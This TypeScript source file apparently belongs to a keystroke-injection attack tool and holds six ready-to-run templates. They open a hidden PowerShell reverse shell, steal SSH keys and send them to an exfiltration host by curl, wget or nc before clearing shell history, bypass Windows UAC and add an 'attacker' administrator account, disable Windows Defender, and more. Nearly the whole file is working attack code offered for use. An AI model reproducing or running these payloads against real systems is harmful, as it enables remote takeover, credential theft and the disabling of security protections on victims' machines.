import { AttackTemplate } from '../types';

export const ATTACK_TEMPLATES: AttackTemplate[] = [
  {
    id: 'windows-reverse-shell',
    name: 'Windows Reverse Shell',
    description: 'Creates a reverse TCP shell connection from target Windows machine to attacker',
    category: 'windows',
    severity: 'critical',
    parameters: [
      {
        name: 'LHOST',
        description: 'Attacker IP address',
        type: 'string',
        defaultValue: '192.168.1.100',
        required: true,
        placeholder: '192.168.1.100',
      },
      {
        name: 'LPORT',
        description: 'Attacker listening port',
        type: 'number',
        defaultValue: 4444,
        required: true,
        placeholder: '4444',
      },
    ],
    script: `@id: windows-reverse-shell
@name: Windows Reverse Shell
@description: Creates a reverse TCP shell connection from target Windows machine to attacker
@category: windows
@severity: critical
@param: LHOST | string | required | Attacker IP address | 192.168.1.100
@param: LPORT | number | required | Attacker listening port | 4444

DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
DELAY 500
ENTER
DELAY 2000
STRING $client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});
DELAY 300
ENTER
STRING $s = $client.GetStream();
DELAY 300
ENTER
STRING [byte[]]$b = 0..65535|%{0};
DELAY 300
ENTER
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;
DELAY 300
ENTER
STRING $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
DELAY 300
ENTER
STRING $sb = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes((iex $d 2>&1 | Out-String ));
DELAY 300
ENTER
STRING $s.Write($sb, 0, $sb.Length);
DELAY 300
ENTER
STRING $s.Flush();
DELAY 300
ENTER
STRING };
DELAY 300
ENTER
STRING $client.Close();
DELAY 300
ENTER
`,
  },
  {
    id: 'macos-privilege-escalation',
    name: 'macOS Privilege Escalation',
    description: 'Attempts to escalate privileges on macOS using various techniques',
    category: 'macos',
    severity: 'high',
    parameters: [
      {
        name: 'PASSWORD',
        description: 'Target user password',
        type: 'string',
        defaultValue: 'password123',
        required: true,
        placeholder: 'password123',
      },
    ],
    script: `@id: macos-privilege-escalation
@name: macOS Privilege Escalation
@description: Attempts to escalate privileges on macOS using various techniques
@category: macos
@severity: high
@param: PASSWORD | string | required | Target user password | password123

DELAY 1000
COMMAND space
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 2000
STRING sudo -s
DELAY 300
ENTER
DELAY 1000
STRING {{PASSWORD}}
DELAY 300
ENTER
DELAY 1000
STRING whoami > /tmp/priv_check.txt
DELAY 300
ENTER
STRING cat /tmp/priv_check.txt
DELAY 300
ENTER
STRING dscl . -append /Groups/admin GroupMembership $USER
DELAY 300
ENTER
STRING defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser -string $USER
DELAY 300
ENTER
STRING launchctl load -w /System/Library/LaunchDaemons/ssh.plist 2>/dev/null || true
DELAY 300
ENTER
STRING systemsetup -setremotelogin on 2>/dev/null || true
DELAY 300
ENTER
STRING id
DELAY 300
ENTER
`,
  },
  {
    id: 'linux-ssh-steal',
    name: 'Linux SSH Key Theft',
    description: 'Steals SSH private keys from the target Linux system',
    category: 'linux',
    severity: 'critical',
    parameters: [
      {
        name: 'EXFIL_HOST',
        description: 'Exfiltration server IP',
        type: 'string',
        defaultValue: '192.168.1.100',
        required: true,
        placeholder: '192.168.1.100',
      },
      {
        name: 'EXFIL_PORT',
        description: 'Exfiltration server port',
        type: 'number',
        defaultValue: 8080,
        required: true,
        placeholder: '8080',
      },
    ],
    script: `@id: linux-ssh-steal
@name: Linux SSH Key Theft
@description: Steals SSH private keys from the target Linux system
@category: linux
@severity: critical
@param: EXFIL_HOST | string | required | Exfiltration server IP | 192.168.1.100
@param: EXFIL_PORT | number | required | Exfiltration server port | 8080

DELAY 1000
CTRL ALT t
DELAY 1000
STRING mkdir -p /tmp/.ssh_keys
DELAY 300
ENTER
STRING cp -r ~/.ssh/* /tmp/.ssh_keys/ 2>/dev/null || true
DELAY 300
ENTER
STRING cp /etc/ssh/ssh_host_* /tmp/.ssh_keys/ 2>/dev/null || true
DELAY 300
ENTER
STRING find /home -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read f; do cp "$f" /tmp/.ssh_keys/ 2>/dev/null; done
DELAY 300
ENTER
STRING find /root -name "id_rsa" -o -name "id_dsa" 2>/dev/null | while read f; do cp "$f" /tmp/.ssh_keys/ 2>/dev/null; done
DELAY 300
ENTER
STRING ls -la /tmp/.ssh_keys/
DELAY 300
ENTER
STRING tar czf /tmp/.ssh_keys.tar.gz -C /tmp .ssh_keys
DELAY 300
ENTER
STRING curl -X POST -F "file=@/tmp/.ssh_keys.tar.gz" http://{{EXFIL_HOST}}:{{EXFIL_PORT}}/upload 2>/dev/null || wget --post-file=/tmp/.ssh_keys.tar.gz http://{{EXFIL_HOST}}:{{EXFIL_PORT}}/upload 2>/dev/null || nc -w 3 {{EXFIL_HOST}} {{EXFIL_PORT}} < /tmp/.ssh_keys.tar.gz 2>/dev/null
DELAY 300
ENTER
STRING rm -rf /tmp/.ssh_keys /tmp/.ssh_keys.tar.gz
DELAY 300
ENTER
STRING history -c
DELAY 300
ENTER
`,
  },
  {
    id: 'bypass-uac',
    name: 'Windows UAC Bypass',
    description: 'Bypasses User Account Control on Windows systems',
    category: 'windows',
    severity: 'high',
    parameters: [
      {
        name: 'TECHNIQUE',
        description: 'UAC bypass technique (fodhelper|eventvwr|sdclt)',
        type: 'string',
        defaultValue: 'fodhelper',
        required: false,
        placeholder: 'fodhelper',
      },
    ],
    script: `@id: bypass-uac
@name: Windows UAC Bypass
@description: Bypasses User Account Control on Windows systems
@category: windows
@severity: high
@param: TECHNIQUE | string | optional | UAC bypass technique (fodhelper|eventvwr|sdclt) | fodhelper

DELAY 1000
GUI r
DELAY 500
STRING cmd /c "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \\"cmd.exe /c powershell -Command Start-Process cmd -Verb RunAs\\" /f"
DELAY 300
ENTER
DELAY 1000
STRING reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /d "" /f
DELAY 300
ENTER
DELAY 500
IF_OS windows
  STRING fodhelper.exe
  DELAY 300
  ENTER
  DELAY 2000
  STRING reg delete HKCU\\Software\\Classes\\ms-settings /f
  DELAY 300
  ENTER
  STRING whoami /priv
  DELAY 300
  ENTER
  STRING net user attacker P@ssw0rd123! /add 2>nul
  DELAY 300
  ENTER
  STRING net localgroup administrators attacker /add 2>nul
  DELAY 300
  ENTER
END_IF
DELAY 500
STRING echo UAC bypass complete
DELAY 300
ENTER
`,
  },
  {
    id: 'disable-defender',
    name: 'Disable Windows Defender',
    description: 'Disables Windows Defender antivirus and real-time protection',
    category: 'windows',
    severity: 'high',
    parameters: [
      {
        name: 'DISABLE_TAMPER',
        description: 'Also attempt to disable Tamper Protection',
        type: 'boolean',
        defaultValue: true,
        required: false,
      },
    ],
    script: `@id: disable-defender
@name: Disable Windows Defender
@description: Disables Windows Defender antivirus and real-time protection
@category: windows
@severity: high
@param: DISABLE_TAMPER | boolean | optional | Also attempt to disable Tamper Protection | true

DELAY 1000
GUI x
DELAY 500
STRING a
DELAY 300
SHIFT ENTER
DELAY 2000
LEFT
DELAY 200
ENTER
DELAY 2000
STRING powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
DELAY 300
ENTER
DELAY 1000
STRING powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableScriptScanning $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableArchiveScanning $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableAutoExclusions $false"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisablePrivacyMode $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
DELAY 300
ENTER
DELAY 500
STRING powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
DELAY 300
ENTER
DELAY 500
STRING sc config WinDefend start= disabled
DELAY 300
ENTER
DELAY 500
STRING sc stop WinDefend
DELAY 300
ENTER
DELAY 500
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
DELAY 300
ENTER
DELAY 500
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
DELAY 300
ENTER
DELAY 500
STRING Get-MpComputerStatus | Select-Object -Property AntivirusEnabled, RealTimeProtectionEnabled
DELAY 300
ENTER
`,
  },
  {
    id: 'usb-boot-execute',
    name: 'USB Boot Execution',
    description: 'Forces system to boot from USB device and execute payload',
    category: 'general',
    severity: 'critical',
    parameters: [
      {
        name: 'PAYLOAD_PATH',
        description: 'Path to payload on USB',
        type: 'string',
        defaultValue: '\\payload.exe',
        required: false,
        placeholder: '\\payload.exe',
      },
      {
        name: 'BOOT_MENU_KEY',
        description: 'BIOS boot menu key (f12|f11|esc|del)',
        type: 'string',
        defaultValue: 'f12',
        required: false,
        placeholder: 'f12',
      },
    ],
    script: `@id: usb-boot-execute
@name: USB Boot Execution
@description: Forces system to boot from USB device and execute payload
@category: general
@severity: critical
@param: PAYLOAD_PATH | string | optional | Path to payload on USB | \\payload.exe
@param: BOOT_MENU_KEY | string | optional | BIOS boot menu key (f12|f11|esc|del) | f12

DELAY 1000
REPEAT 10
  GUI l
  DELAY 200
END_REPEAT
DELAY 500
GUI r
DELAY 500
STRING shutdown /r /fw /t 0
DELAY 300
ENTER
DELAY 5000
REPEAT 30
  KEY {{BOOT_MENU_KEY}}
  DELAY 100
END_REPEAT
DELAY 3000
DOWN
DELAY 200
ENTER
DELAY 10000
IF_OS windows
  DELAY 3000
  GUI r
  DELAY 500
  STRING cmd.exe
  DELAY 300
  ENTER
  DELAY 2000
  STRING wmic logicaldisk get name, drivetype | find "2"
  DELAY 300
  ENTER
  DELAY 1000
  STRING for %d in (D: E: F: G: H: I:) do if exist %d{{PAYLOAD_PATH}} (start %d{{PAYLOAD_PATH}})
  DELAY 300
  ENTER
  DELAY 500
  STRING echo Boot payload executed
  DELAY 300
  ENTER
END_IF
IF_OS linux
  DELAY 3000
  CTRL ALT t
  DELAY 2000
  STRING sudo fdisk -l | grep /dev/sd
  DELAY 300
  ENTER
  DELAY 1000
  STRING sudo mount /dev/sdb1 /mnt 2>/dev/null || sudo mount /dev/sdc1 /mnt 2>/dev/null
  DELAY 300
  ENTER
  DELAY 1000
  STRING ls -la /mnt/
  DELAY 300
  ENTER
  STRING chmod +x /mnt{{PAYLOAD_PATH}} && sudo /mnt{{PAYLOAD_PATH}}
  DELAY 300
  ENTER
END_IF
`,
  },
];

export const getTemplateById = (id: string): AttackTemplate | undefined => {
  return ATTACK_TEMPLATES.find((template) => template.id === id);
};

export const getTemplatesByCategory = (
  category: 'windows' | 'macos' | 'linux' | 'general'
): AttackTemplate[] => {
  return ATTACK_TEMPLATES.filter((template) => template.category === category);
};

export const getTemplatesBySeverity = (
  severity: 'low' | 'medium' | 'high' | 'critical'
): AttackTemplate[] => {
  return ATTACK_TEMPLATES.filter((template) => template.severity === severity);
};
